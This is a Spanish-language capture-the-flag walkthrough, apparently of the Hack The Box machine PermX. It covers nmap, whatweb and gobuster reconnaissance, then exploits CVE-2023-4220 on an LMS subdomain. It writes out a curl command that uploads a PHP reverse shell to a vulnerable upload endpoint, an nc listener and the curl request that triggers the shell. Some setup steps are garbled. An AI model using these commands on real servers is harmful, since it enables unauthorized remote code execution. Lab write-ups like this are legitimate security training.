# Reconocimiento
sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.23

# Resultado

| port | state | service | reason | version |
|------|-------|---------|--------|---------|
| 22 | open | ssh |  syn-ack | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) |
| 80 | open | http |  syn-ack | Apache httpd 2.4.52 |

- Copiamos la ip en la url de nuestro navegador.
- revisamos la web cargada.
- encontramos la url (http://permx.htb/).

# Copiamos la url en el archivo
- cd nano /etc/hosts
- ip 10.10.11.23 http://permx.htb/
- guardamos con ctrl + s
- ctrl + x

# Realizamos un escaneo con
> whatweb -v -a 3 http://permx.htb/ 

# Encontramos

| Resultado |
|-----------|
| Summary   : Apache[2.4.52], |
|  Bootstrap[5.0.0] |
| Email[permx@htb.com] |
| HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)] |
| JQuery[3.4.1] |

# Ataque de directorio con Gobuster

| ataque | estado |
|--------|--------|
| sudo gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://permx.htb --append-domain | grep -v "Status: 302" | exitoso |

| resultado |
|-----------|
| lms.permx.htb |

# Reconocimiento de la nueva url encontrada con whatweb

|Ataque|
|------|
| whatweb -v -a 3 http://lms.permx.htb/index.php |


|resultados|
|----------|
| Apache |
| Version      : 2.4.52 (from HTTP Server Header) Google Dorks: (3)  
| Website     : http://httpd.apache.org/ |

# CVE

- CVE-2023-4220

- Investigamos en internet la revershell que podriamos usar con este CVE
- Descargamos la shell
- La enviamos al servidor 

curl -F 'bigUploadFile=@sheel.php' 'http://lms.permx.htb//main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 

- Nos colocamos en escucha

| nc |
| sudo nc -lvnp 9001 |

- Ejecutamos la Revershell

curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'

